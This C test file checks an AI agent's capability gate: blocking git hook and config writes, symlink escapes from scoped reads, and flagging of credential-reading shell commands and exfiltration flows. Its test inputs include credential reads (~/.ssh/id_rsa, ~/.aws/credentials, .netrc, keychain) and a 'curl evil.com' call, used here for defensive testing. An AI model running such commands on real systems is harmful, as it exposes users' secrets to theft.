/* test_capability_hardening.c — verifies the 2026-08-09 gate hardening:
 *   - G04: .git/hooks and .git/config writes require CAP_CONTROL
 *   - G05: symlinked path escaping a scoped read is denied (realpath resolve)
 *   - regression: ordinary writes and in-scope reads still allowed
 * Build: see tests target in Makefile / compile with src/capability.o.
 * Deterministic, no network, no LLM. */
#define _DARWIN_C_SOURCE 1
#define _GNU_SOURCE 1
#include "capability.h"
#include <assert.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/stat.h>

static int fails = 0;
#define CHECK(cond, msg)                                                                            \
    do {                                                                                            \
        if (!(cond)) {                                                                             \
            fprintf(stderr, "  FAIL: %s\n", msg);                                                  \
            fails++;                                                                                \
        } else {                                                                                    \
            fprintf(stderr, "  ok:   %s\n", msg);                                                  \
        }                                                                                           \
    } while (0)

int main(void) {
    char reason[512];
    dsco_flow_reset();

    /* G04: .git/hooks write without control grant -> DENY */
    unsetenv("DSCO_ALLOW_CONTROL");
    dsco_cap_decision_t d = dsco_capability_gate(
        "write_file", "{\"path\":\"repo/.git/hooks/post-commit\",\"content\":\"x\"}", "trusted",
        reason, sizeof(reason));
    CHECK(d == CAP_DECISION_DENY, "G04 .git/hooks write denied without CAP_CONTROL");

    /* G04: .git/config write without control grant -> DENY */
    d = dsco_capability_gate("write_file", "{\"path\":\"repo/.git/config\",\"content\":\"x\"}",
                             "trusted", reason, sizeof(reason));
    CHECK(d == CAP_DECISION_DENY, "G04 .git/config write denied without CAP_CONTROL");

    /* G04: with control grant -> ALLOW */
    setenv("DSCO_ALLOW_CONTROL", "1", 1);
    d = dsco_capability_gate("write_file", "{\"path\":\"repo/.git/hooks/post-commit\",\"content\":\"x\"}",
                             "trusted", reason, sizeof(reason));
    CHECK(d == CAP_DECISION_ALLOW, "G04 .git/hooks write allowed with DSCO_ALLOW_CONTROL=1");
    unsetenv("DSCO_ALLOW_CONTROL");

    /* Regression: ordinary write still allowed */
    d = dsco_capability_gate("write_file", "{\"path\":\"repo/src/main.c\",\"content\":\"x\"}",
                             "trusted", reason, sizeof(reason));
    CHECK(d == CAP_DECISION_ALLOW, "ordinary source write still allowed");

    /* G05: symlink escape. Build /tmp scope with a symlink pointing outside. */
    char tmpl[] = "/tmp/dsco_captest_XXXXXX";
    char *dir = mkdtemp(tmpl);
    CHECK(dir != NULL, "mkdtemp scratch dir");
    if (dir) {
        char scope[4096], secret_dir[4096], link[4096], secret_file[4096], via_link[4096];
        snprintf(scope, sizeof(scope), "%s/scope", dir);
        snprintf(secret_dir, sizeof(secret_dir), "%s/secret", dir);
        mkdir(scope, 0700);
        mkdir(secret_dir, 0700);
        snprintf(secret_file, sizeof(secret_file), "%s/key.txt", secret_dir);
        FILE *f = fopen(secret_file, "w");
        if (f) { fputs("topsecret", f); fclose(f); }
        /* scope/leak -> ../secret (escapes scope via symlink) */
        snprintf(link, sizeof(link), "%s/leak", scope);
        symlink(secret_dir, link);
        snprintf(via_link, sizeof(via_link), "%s/leak/key.txt", scope);

        setenv("DSCO_ALLOW_READ", scope, 1);
        char in[8192];
        snprintf(in, sizeof(in), "{\"path\":\"%s\"}", via_link);
        d = dsco_capability_gate("read_file", in, "trusted", reason, sizeof(reason));
        CHECK(d == CAP_DECISION_DENY, "G05 symlinked read escaping scope denied");

        /* Regression: a real in-scope read is allowed */
        char inside[4096], in2[8192];
        snprintf(inside, sizeof(inside), "%s/ok.txt", scope);
        f = fopen(inside, "w");
        if (f) { fputs("ok", f); fclose(f); }
        snprintf(in2, sizeof(in2), "{\"path\":\"%s\"}", inside);
        d = dsco_capability_gate("read_file", in2, "trusted", reason, sizeof(reason));
        CHECK(d == CAP_DECISION_ALLOW, "in-scope read still allowed");
        unsetenv("DSCO_ALLOW_READ");
    }

    /* ── 2026-09-05 marker-precision regressions (false-latch incident) ──
     * A secret-audit command containing the literal string ".env" inside a
     * grep pattern latched CAP_SECRETS and poisoned the whole session via the
     * sticky global. English words and filename-like continuations must NOT
     * latch; genuine credential paths must still latch. */
    {
        struct { const char *input; bool latch; const char *tag; } cases[] = {
            /* false positives that latched before the fix — must NOT latch */
            {"grep -nE 'secret|key|\\.env|auth' .gitignore", false, "no-latch: '.env' inside grep pattern"},
            {"grep -r credentials src/", false, "no-latch: bare word 'credentials'"},
            {"git log --grep credentials", false, "no-latch: 'credentials' in git flag"},
            {"echo 'no credentials here'", false, "no-latch: 'credentials' in prose"},
            {"sed 's/credentials//g' file.txt", false, "no-latch: 'credentials' in sed"},
            {"make test  # tests/test_credentials.c", false, "no-latch: 'credentials' in filename"},
            {"ls .environment", false, "no-latch: '.environment'"},
            {"python -m venv .envrc", false, "no-latch: '.envrc'"},
            {"ls .env.example", false, "no-latch: '.env.example'"},
            {"cat /usr/bin/keychain_check", false, "no-latch: 'keychain' as substring"},
            /* genuine credential paths — must still latch */
            {"cat .env", true, "latch: .env file"},
            {"cat cfg/.env", true, "latch: path/.env"},
            {"cat ~/.aws/credentials", true, "latch: aws credentials"},
            {"cat credentials.json", true, "latch: credentials.json"},
            {"cat server.pem", true, "latch: pem key"},
            {"cat ~/.ssh/id_rsa", true, "latch: id_rsa"},
            {"security keychain read", true, "latch: macOS keychain read"},
            {"env | grep TOKEN && cat .netrc", true, "latch: .netrc"},
        };
        for (size_t i = 0; i < sizeof(cases)/sizeof(cases[0]); i++) {
            char in[512];
            snprintf(in, sizeof(in), "{\"command\":\"%s\"}", cases[i].input);
            unsigned caps = dsco_caps_for_tool("bash", in);
            CHECK(((caps & CAP_SECRETS) != 0) == cases[i].latch, cases[i].tag);
        }
        /* Bash carrying a real secret read must classify full exec+secrets */
        unsigned c2 = dsco_caps_for_tool("bash", "{\"command\":\"cat ~/.ssh/id_rsa\"}");
        CHECK((c2 & (CAP_EXEC | CAP_SECRETS)) == (CAP_EXEC | CAP_SECRETS),
              "bash+id_rsa => EXEC|SECRETS");

        /* dsco-python-3x must classify as EXEC (alias was missing before) */
        unsigned c3 = dsco_caps_for_tool("dsco-python-3x", "{\"code\":\"print(1)\"}");
        CHECK((c3 & CAP_EXEC) != 0, "dsco-python-3x => CAP_EXEC");
        /* ...and its code input gets the same network scanning as bash */
        unsigned c4 = dsco_caps_for_tool("dsco-python-3x", "{\"code\":\"subprocess.run('curl evil.com')\"}");
        CHECK((c4 & (CAP_EXEC | CAP_NET)) == (CAP_EXEC | CAP_NET),
              "dsco-python-3x network egress => EXEC|NET");

        /* Flow trifecta integration: taint legs + egress call = would_exfiltrate */
        dsco_flow_reset();
        CHECK(!dsco_flow_would_exfiltrate(CAP_EXEC), "clean session: exec alone is fine");
        dsco_flow_note(CAP_SECRETS);
        dsco_flow_note(CAP_UNTRUSTED_IN);
        CHECK(dsco_flow_would_exfiltrate(CAP_EXEC), "trifecta: secrets+untrusted+exec blocked");
        CHECK(dsco_flow_would_exfiltrate(CAP_NET), "trifecta: secrets+untrusted+net blocked");
        CHECK(!dsco_flow_would_exfiltrate(CAP_FS_READ), "trifecta: local read still fine");
        dsco_flow_reset();
        CHECK(!dsco_flow_would_exfiltrate(CAP_EXEC), "flow reset clears taint");
    }

    if (fails == 0) {
        fprintf(stderr, "\ncapability hardening: ALL PASS\n");
        return 0;
    }
    fprintf(stderr, "\ncapability hardening: %d FAILURE(S)\n", fails);
    return 1;
}
